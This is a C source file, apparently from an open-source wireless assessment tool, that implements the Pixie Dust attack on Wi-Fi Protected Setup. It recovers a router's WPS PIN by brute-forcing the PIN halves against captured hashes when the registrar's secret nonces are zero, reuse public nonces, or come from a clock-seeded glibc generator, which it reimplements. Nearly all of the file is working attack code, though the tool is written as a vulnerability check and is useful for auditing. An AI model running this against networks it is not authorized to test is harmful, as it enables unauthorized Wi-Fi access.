/* Basanos — Pixie Dust. SPDX-License-Identifier: MIT */
#include "basanos/pixie.h"
#include "basanos/wpspin.h"
#include "basanos/rbac.h"          /* bas_hmac_sha256 */

#include <string.h>

const char *bas_pixie_vuln_name(bas_pixie_vuln_t v)
{
    switch (v) {
    case BAS_PIXIE_ZERO:      return "zero secret nonces";
    case BAS_PIXIE_ENONCE:    return "secret nonce reuses enrollee nonce";
    case BAS_PIXIE_RNONCE:    return "secret nonce reuses registrar nonce";
    case BAS_PIXIE_PRNG_TIME: return "clock-seeded nonce generator";
    default:                  return "none";
    }
}

const char *bas_pixie_vuln_detail(bas_pixie_vuln_t v)
{
    switch (v) {
    case BAS_PIXIE_ZERO:
        return "The registrar's two secret nonces were all-zero, so the PIN "
               "followed from values it transmitted itself.";
    case BAS_PIXIE_ENONCE:
        return "The registrar reused the enrollee's nonce as its own secret. "
               "That value was sent in the clear in M1.";
    case BAS_PIXIE_RNONCE:
        return "The registrar reused its own public nonce as its secret. That "
               "value was sent in the clear in M2.";
    case BAS_PIXIE_PRNG_TIME:
        return "The registrar seeded its generator from the clock and drew the "
               "public nonce and both secrets from it in sequence.";
    default:
        return "The registrar's secret nonces were not any value a broken "
               "implementation produces.";
    }
}

/* PSK1/PSK2: the first 128 bits of the AuthKey HMAC over four ASCII digits. */
static void psk_half(const uint8_t authkey[BAS_PIXIE_HASH],
                     uint16_t four_digits, uint8_t out[16])
{
    char d[4];
    d[0] = (char)('0' + (four_digits / 1000u) % 10u);
    d[1] = (char)('0' + (four_digits / 100u)  % 10u);
    d[2] = (char)('0' + (four_digits / 10u)   % 10u);
    d[3] = (char)('0' + (four_digits)         % 10u);

    uint8_t mac[BAS_PIXIE_HASH];
    bas_hmac_sha256(authkey, BAS_PIXIE_HASH, d, sizeof(d), mac);
    memcpy(out, mac, 16);
}

/* R-Hash = HMAC(AuthKey, R-S || PSK || PKE || PKR). */
static void r_hash(const bas_pixie_in_t *in,
                   const uint8_t rs[BAS_PIXIE_NONCE],
                   const uint8_t psk[16],
                   uint8_t out[BAS_PIXIE_HASH])
{
    /* 416 bytes, and this runs eleven thousand times per class. File scope
     * keeps it off the caller's stack; the solver is synchronous and is never
     * entered from two tasks at once, which is the only thing that would make
     * this wrong. */
    static uint8_t buf[BAS_PIXIE_NONCE + 16 + BAS_PIXIE_DH_LEN * 2];
    size_t n = 0;
    memcpy(buf + n, rs, BAS_PIXIE_NONCE);       n += BAS_PIXIE_NONCE;
    memcpy(buf + n, psk, 16);                   n += 16;
    memcpy(buf + n, in->pke, BAS_PIXIE_DH_LEN); n += BAS_PIXIE_DH_LEN;
    memcpy(buf + n, in->pkr, BAS_PIXIE_DH_LEN); n += BAS_PIXIE_DH_LEN;
    bas_hmac_sha256(in->authkey, BAS_PIXIE_HASH, buf, n, out);
}

int bas_pixie_first_half(const bas_pixie_in_t *in,
                         const uint8_t rs1[BAS_PIXIE_NONCE])
{
    if (in == NULL || rs1 == NULL) {
        return -1;
    }
    for (uint16_t v = 0; v < 10000u; v++) {
        uint8_t psk1[16], h[BAS_PIXIE_HASH];
        psk_half(in->authkey, v, psk1);
        r_hash(in, rs1, psk1, h);
        if (memcmp(h, in->rhash1, BAS_PIXIE_HASH) == 0) {
            return (int)v;
        }
    }
    return -1;
}

int bas_pixie_second_half(const bas_pixie_in_t *in,
                          const uint8_t rs2[BAS_PIXIE_NONCE],
                          uint16_t first_half)
{
    if (in == NULL || rs2 == NULL) {
        return -1;
    }
    /* Only the three free digits are searched: the eighth is the
     * specification's checksum over the first seven, so nine of every ten
     * four-digit values cannot be the second half of any legal PIN. */
    for (uint16_t body = 0; body < 1000u; body++) {
        uint32_t seven = (uint32_t)first_half * 1000u + body;
        uint16_t four  = (uint16_t)(body * 10u + bas_wps_pin_checksum(seven));

        uint8_t psk2[16], h[BAS_PIXIE_HASH];
        psk_half(in->authkey, four, psk2);
        r_hash(in, rs2, psk2, h);
        if (memcmp(h, in->rhash2, BAS_PIXIE_HASH) == 0) {
            return (int)four;
        }
    }
    return -1;
}

/* --- glibc's additive-feedback generator ---------------------------------- */

void bas_glibc_srand(bas_glibc_rng_t *g, uint32_t seed)
{
    if (g == NULL) {
        return;
    }
    memset(g, 0, sizeof(*g));

    /* A zero seed is replaced by one, exactly as the library does -- the
     * recurrence has a fixed point at zero and would emit nothing else. */
    g->r[0] = (int32_t)(seed == 0u ? 1u : seed);

    for (int i = 1; i < 31; i++) {
        /* r[i] = (16807 * r[i-1]) % 2147483647, computed by Schrage's method
         * so the intermediate product never overflows 32 bits. */
        int64_t hi = g->r[i - 1] / 127773;
        int64_t lo = g->r[i - 1] % 127773;
        int64_t w  = 16807 * lo - 2836 * hi;
        if (w < 0) {
            w += 2147483647;
        }
        g->r[i] = (int32_t)w;
    }
    for (int i = 31; i < 34; i++) {
        g->r[i] = g->r[i - 31];
    }
    for (int i = 34; i < 344; i++) {
        g->r[i] = (int32_t)((uint32_t)g->r[i - 31] + (uint32_t)g->r[i - 3]);
    }
    g->idx = 344;
}

uint32_t bas_glibc_rand(bas_glibc_rng_t *g)
{
    if (g == NULL) {
        return 0;
    }
    /* The state is a 344-entry window over an unbounded sequence. Rather than
     * index past the end, each draw appends and slides -- the two taps stay at
     * a fixed distance from the newest entry. */
    uint32_t v = (uint32_t)g->r[344 - 31] + (uint32_t)g->r[344 - 3];
    memmove(&g->r[0], &g->r[1], sizeof(g->r) - sizeof(g->r[0]));
    g->r[343] = (int32_t)v;
    return v >> 1;
}

void bas_glibc_bytes(bas_glibc_rng_t *g, uint8_t *out, size_t n)
{
    if (g == NULL || out == NULL) {
        return;
    }
    for (size_t i = 0; i < n; i++) {
        out[i] = (uint8_t)(bas_glibc_rand(g) & 0xFFu);
    }
}

uint32_t bas_pixie_find_seed(const uint8_t enonce[BAS_PIXIE_NONCE],
                             uint32_t from, uint32_t to)
{
    if (enonce == NULL || to < from) {
        return 0;
    }
    for (uint32_t s = from; s <= to; s++) {
        bas_glibc_rng_t g;
        uint8_t probe[BAS_PIXIE_NONCE];
        bas_glibc_srand(&g, s);
        bas_glibc_bytes(&g, probe, sizeof(probe));
        if (memcmp(probe, enonce, BAS_PIXIE_NONCE) == 0) {
            return s;
        }
        if (s == 0xFFFFFFFFu) {
            break;                        /* do not wrap the counter */
        }
    }
    return 0;
}

void bas_pixie_run(const bas_pixie_in_t *in, bas_pixie_out_t *out)
{
    if (out == NULL) {
        return;
    }
    memset(out, 0, sizeof(*out));
    if (in == NULL) {
        return;
    }

    static const uint8_t zeros[BAS_PIXIE_NONCE] = { 0 };

    /* Ordered cheapest-first. Each class is one pass of at most 11,000 HMACs,
     * so ruling all of them out is still under a second on this part. */
    const struct {
        const uint8_t   *rs;
        bas_pixie_vuln_t vuln;
    } trial[] = {
        { zeros,      BAS_PIXIE_ZERO   },
        { in->enonce, BAS_PIXIE_ENONCE },
        { in->rnonce, BAS_PIXIE_RNONCE },
    };

    for (size_t i = 0; i < sizeof(trial) / sizeof(trial[0]); i++) {
        int first = bas_pixie_first_half(in, trial[i].rs);
        out->tried += 10000u;
        if (first < 0) {
            continue;
        }
        int second = bas_pixie_second_half(in, trial[i].rs, (uint16_t)first);
        out->tried += 1000u;
        if (second < 0) {
            /* The first half matched but the second did not. The registrar
             * used one weak value for R-S1 and something else for R-S2, which
             * is still a real finding -- half a PIN is 10,000 times less work
             * than a whole one -- but it is not a recovered credential and is
             * not reported as one. */
            continue;
        }
        out->found = true;
        out->vuln  = trial[i].vuln;
        out->pin   = (uint32_t)first * 10000u + (uint32_t)second;
        return;
    }

    /* The clock-seeded class. The registrar draws its public nonce and then
     * both secrets from one generator, back to back, so the nonce it sent in
     * the clear identifies the seed and the seed yields the secrets.
     *
     * The seed is the registrar's clock, which is not observable from here.
     * A router that has never reached an NTP server counts from zero, so its
     * seed is simply its uptime in seconds -- that window is small and is
     * swept here. A router with real time has a seed near the true epoch,
     * which this cannot know, and the sweep will not find it. That is a
     * limitation of running on the device rather than beside a capture, and
     * it is stated rather than hidden: a negative result from this class
     * means "not found in the swept window", never "not vulnerable". */
    for (uint32_t seed = 0; seed < BAS_PIXIE_SEED_SWEEP; seed++) {
        bas_glibc_rng_t g;
        uint8_t probe[BAS_PIXIE_NONCE];
        bas_glibc_srand(&g, seed);
        bas_glibc_bytes(&g, probe, sizeof(probe));
        if (memcmp(probe, in->rnonce, BAS_PIXIE_NONCE) != 0) {
            continue;
        }
        /* The seed is identified. The two secrets are the next draws. */
        uint8_t rs1[BAS_PIXIE_NONCE], rs2[BAS_PIXIE_NONCE];
        bas_glibc_bytes(&g, rs1, sizeof(rs1));
        bas_glibc_bytes(&g, rs2, sizeof(rs2));

        int first = bas_pixie_first_half(in, rs1);
        out->tried += 10000u;
        if (first < 0) {
            break;                    /* right seed, wrong model: stop */
        }
        int second = bas_pixie_second_half(in, rs2, (uint16_t)first);
        out->tried += 1000u;
        if (second < 0) {
            break;
        }
        out->found = true;
        out->vuln  = BAS_PIXIE_PRNG_TIME;
        out->pin   = (uint32_t)first * 10000u + (uint32_t)second;
        return;
    }
}
